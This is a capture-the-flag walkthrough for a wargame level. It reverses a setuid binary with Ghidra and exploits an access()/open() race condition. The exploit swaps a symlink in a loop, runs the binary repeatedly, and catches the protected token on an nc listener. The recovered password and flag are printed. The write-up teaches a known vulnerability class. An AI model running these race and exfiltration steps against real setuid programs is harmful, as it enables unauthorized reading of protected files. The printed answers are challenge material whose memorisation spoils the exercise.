## Step 1: Identifying the User

We begin by checking our current user informations:

```bash
$ id
uid=2010(level10) gid=2010(level10) groups=2010(level10),100(users)
```

This shows that we are operating as the user `level10`.

---
## Step 2: Searching for Files

```bash
$ ls -la
-rwsr-sr-x+ 1 flag10  level10 10817 Mar  5  2016 level10
-rw-------  1 flag10  flag10     26 Mar  5  2016 token


$ file level10
level10: setuid setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0xf7e21fb68568fa57d6317d0535b97d9fca66f841, not stripped

$ file token
token: regular file, no read permission
```
The level10 binary is a setuid ELF executable, meaning it executes with flag10 user's privileges.


---
## Step 3: Reversing Binary with Ghidra

```c
void main(int param_1,undefined4 *param_2)

{
  char *__cp;
  uint16_t uVar1;
  int iVar2;
  int iVar3;
  ssize_t sVar4;
  size_t __n;
  int *piVar5;
  char *pcVar6;
  int in_GS_OFFSET;
  undefined local_1024 [4096];
  sockaddr local_24;
  int local_14;
  
  local_14 = *(int *)(in_GS_OFFSET + 0x14);
  if (param_1 < 3) {
    printf("%s file host\n\tsends file to host if you have access to it\n",*param_2);
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  pcVar6 = (char *)param_2[1];
  __cp = (char *)param_2[2];
  iVar2 = access((char *)param_2[1],4);
  if (iVar2 == 0) {
    printf("Connecting to %s:6969 .. ",__cp);
    fflush(stdout);
    iVar2 = socket(2,1,0);
    local_24.sa_data[2] = '\0';
    local_24.sa_data[3] = '\0';
    local_24.sa_data[4] = '\0';
    local_24.sa_data[5] = '\0';
    local_24.sa_data[6] = '\0';
    local_24.sa_data[7] = '\0';
    local_24.sa_data[8] = '\0';
    local_24.sa_data[9] = '\0';
    local_24.sa_data[10] = '\0';
    local_24.sa_data[0xb] = '\0';
    local_24.sa_data[0xc] = '\0';
    local_24.sa_data[0xd] = '\0';
    local_24.sa_family = 2;
    local_24.sa_data[0] = '\0';
    local_24.sa_data[1] = '\0';
    local_24.sa_data._2_4_ = inet_addr(__cp);
    uVar1 = htons(0x1b39);
    local_24.sa_data._0_2_ = uVar1;
    iVar3 = connect(iVar2,&local_24,0x10);
    if (iVar3 == -1) {
      printf("Unable to connect to host %s\n",__cp);
                    /* WARNING: Subroutine does not return */
      exit(1);
    }
    sVar4 = write(iVar2,".*( )*.\n",8);
    if (sVar4 == -1) {
      printf("Unable to write banner to host %s\n",__cp);
                    /* WARNING: Subroutine does not return */
      exit(1);
    }
    printf("Connected!\nSending file .. ");
    fflush(stdout);
    iVar3 = open(pcVar6,0);
    if (iVar3 == -1) {
      puts("Damn. Unable to open file");
                    /* WARNING: Subroutine does not return */
      exit(1);
    }
    __n = read(iVar3,local_1024,0x1000);
    if (__n == 0xffffffff) {
      piVar5 = __errno_location();
      pcVar6 = strerror(*piVar5);
      printf("Unable to read from file: %s\n",pcVar6);
                    /* WARNING: Subroutine does not return */
      exit(1);
    }
    write(iVar2,local_1024,__n);
    puts("wrote file!");
  }
  else {
    printf("You don\'t have access to %s\n",pcVar6);
  }
  if (local_14 != *(int *)(in_GS_OFFSET + 0x14)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}
```

### Explanation

The binary has a race condition vulnerability due to the access() check being performed before the open() call. This means that there is a small window of time between the access check and the file being opened, during which the file (or its reference) can be swapped.

```bash
$ man access

Warning: Using these calls to check if a user is authorized to, for example, open a file before actually  doing  so  using  open(2) creates a security hole, because the user might exploit the short time interval between checking and opening the file to manipulate it. For this reason, the use of this system call should be avoided.
```


## Step 4: Exploiting the race condition vulnerability
We will exploit the race condition by creating a symbolic link (/tmp/exploit) that alternates between pointing to a file we control (/tmp/test) and the token file, and start an infinite loop to switch the symlink:
```bash
$ echo "..." > /tmp/test

while true; do ln -fs /tmp/test /tmp/exploit; ln -fs ~/token /tmp/exploit; done
```

In a second terminal, run another infinite loop to execute the level10 binary:
```bash
while true; do ./level10 /tmp/exploit machine_ip; done
```

Finally, in a third terminal, set up a listener on port 6969 to capture the output:
```bash
nc -lk 6969
```

### Outcome Scenarios

There are three possible outcomes:

    1. Access to token file fails: The output will be: You don't have access to /tmp/exploit.
    2. Symlink points to test file: The listener will print the contents of /tmp/test.
    3. Symlink points to token file: The listener will print the contents of ~/token, which contains the secret token.


### Listener Output
```bash
...
...
woupa2yuojeeaaed06riuj63c
...
woupa2yuojeeaaed06riuj63c
...
```

```bash
$ su flag10
Password : 
woupa2yuojeeaaed06riuj63c

% getflag
Check flag.Here is your token : feulo4b72j7edeahuete3no7c
```
---

And there you have it, the token is `feulo4b72j7edeahuete3no7c`.